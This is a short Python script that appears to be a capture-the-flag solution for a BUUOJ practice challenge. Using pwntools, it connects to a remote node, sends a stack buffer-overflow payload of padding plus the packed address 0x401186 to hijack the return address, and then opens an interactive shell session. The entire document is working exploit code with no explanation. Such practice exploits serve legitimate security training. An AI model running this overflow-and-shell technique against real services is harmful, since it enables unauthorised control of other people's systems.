from pwn import *
from pwn import p64

io = remote("node4.buuoj.cn", 29541)


buf = "a" * (0xf) +  p64(0x401186).decode("unicode_escape")

io.sendline(buf)

io.interactive()
